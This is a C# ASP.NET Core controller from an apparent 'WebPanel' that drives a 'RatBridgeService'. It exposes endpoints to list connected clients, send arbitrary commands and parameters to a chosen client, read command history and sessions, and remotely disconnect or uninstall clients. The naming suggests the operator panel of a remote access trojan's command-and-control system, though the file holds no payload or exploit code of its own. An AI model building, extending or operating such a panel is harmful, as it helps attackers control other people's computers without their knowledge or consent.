using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebPanel.Data;
using WebPanel.Models;
using WebPanel.Services;

namespace WebPanel.Controllers;

[ApiController]
[Route("api/[controller]")]
[Authorize]
public class ClientsController : ControllerBase
{
    private readonly RatBridgeService _ratBridge;
    private readonly WebPanelDbContext _context;
    private readonly ILogger<ClientsController> _logger;

    public ClientsController(
        RatBridgeService ratBridge,
        WebPanelDbContext context,
        ILogger<ClientsController> logger)
    {
        _ratBridge = ratBridge;
        _context = context;
        _logger = logger;
    }

    [HttpGet]
    public ActionResult<IEnumerable<ClientInfo>> GetClients()
    {
        var clients = _ratBridge.GetConnectedClients();
        return Ok(clients);
    }

    [HttpGet("{clientId}")]
    public ActionResult<ClientInfo> GetClient(string clientId)
    {
        var client = _ratBridge.GetClient(clientId);
        
        if (client == null)
        {
            return NotFound(new { Message = "Client not found" });
        }

        return Ok(client);
    }

    [HttpPost("{clientId}/command")]
    public async Task<ActionResult<CommandResponse>> SendCommand(string clientId, [FromBody] CommandRequest request)
    {
        if (string.IsNullOrWhiteSpace(request.Command))
        {
            return BadRequest(new CommandResponse
            {
                Success = false,
                Message = "Command is required"
            });
        }

        var success = await _ratBridge.SendCommandToClientAsync(clientId, request.Command, request.Parameters);

        if (!success)
        {
            return StatusCode(500, new CommandResponse
            {
                Success = false,
                Message = "Failed to send command to client"
            });
        }

        return Ok(new CommandResponse
        {
            Success = true,
            Message = "Command sent successfully"
        });
    }

    [HttpGet("{clientId}/history")]
    public async Task<ActionResult<IEnumerable<CommandHistory>>> GetCommandHistory(
        string clientId, 
        [FromQuery] int limit = 100)
    {
        var history = await _context.CommandHistory
            .Where(h => h.ClientId == clientId)
            .OrderByDescending(h => h.ExecutedAt)
            .Take(limit)
            .ToListAsync();

        return Ok(history);
    }

    [HttpGet("sessions")]
    public async Task<ActionResult<IEnumerable<ClientSession>>> GetClientSessions(
        [FromQuery] bool onlineOnly = false,
        [FromQuery] int limit = 100)
    {
        var query = _context.ClientSessions.AsQueryable();

        if (onlineOnly)
        {
            query = query.Where(s => s.IsConnected);
        }

        var sessions = await query
            .OrderByDescending(s => s.ConnectedAt)
            .Take(limit)
            .ToListAsync();

        return Ok(sessions);
    }

    [HttpDelete("{clientId}")]
    [Authorize(Roles = "Admin")]
    public async Task<IActionResult> DisconnectClient(string clientId)
    {
        // Send disconnect command
        await _ratBridge.SendCommandToClientAsync(clientId, "disconnect", null);

        _logger.LogInformation("User {Username} disconnected client {ClientId}", 
            User.Identity?.Name, clientId);

        return Ok(new { Success = true, Message = "Disconnect command sent" });
    }

    [HttpPost("{clientId}/uninstall")]
    [Authorize(Roles = "Admin")]
    public async Task<IActionResult> UninstallClient(string clientId)
    {
        // Send uninstall command
        await _ratBridge.SendCommandToClientAsync(clientId, "uninstall", null);

        _logger.LogWarning("User {Username} sent uninstall command to client {ClientId}", 
            User.Identity?.Name, clientId);

        return Ok(new { Success = true, Message = "Uninstall command sent" });
    }
}
